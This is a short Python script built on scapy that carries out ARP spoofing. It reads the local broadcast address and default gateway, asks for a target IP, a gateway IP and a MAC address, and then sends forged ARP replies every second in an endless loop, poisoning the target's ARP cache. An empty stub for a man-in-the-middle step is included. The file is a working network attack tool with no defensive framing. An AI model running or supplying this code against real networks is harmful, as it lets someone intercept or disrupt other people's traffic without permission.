#!/usr/bin/env python

from scapy.all import *
from time import sleep
from sys import platform
import subprocess
import re

IPV4_LENGTH = 13
bcast_string = 'Bcast:'
#default_gateway =
def findBCastAddress():
    if platform.startswith('linux'):
        output = subprocess.Popen('ifconfig', stdout=subprocess.PIPE).communicate()[0]
        start_ip = output.index(bcast_string)
        bcast_ip_address = output[start_ip + len(bcast_string):start_ip + len(bcast_string) + IPV4_LENGTH]
        print('BroadCast Ip address is: '+bcast_ip_address)
        bcast_ip_address = bcast_ip_address.strip()
        return bcast_ip_address

def findDefaultGateWay():
    output = subprocess.Popen('route', stdout=subprocess.PIPE).communicate()[0]
    pattern = re.compile('default\s+')
    mat_object = pattern.search(output)
    index = output.index(mat_object.group(0))
    length = len(mat_object.group(0))
    default_gateway = output[index+length:index+length+IPV4_LENGTH]
    default_gateway = default_gateway.strip()
    print('Default gateway is: '+default_gateway)
    return default_gateway

def man_in_the_middle():
    pass

def spoof():
    findBCastAddress()
    findDefaultGateWay()
    dst_ip = raw_input('Enter the machine IP you want to spoof: ')
    src_ip = raw_input('Enter the default gateway IP: ')
    src_hw = raw_input('Enter the source MAC address: ')
    arp_packet = ARP()
    arp_packet.psrc = src_ip
    arp_packet.hwsrc = src_hw
    arp_packet.pdst = dst_ip
    try:
        i = 0
        while 1:
            print("Number of packets sent: "+str(i))
            send(arp_packet, verbose=0)
            i += 1
            sleep(1)
    except:
        print("Exception occured\n")

if __name__=='__main__':
    spoof()
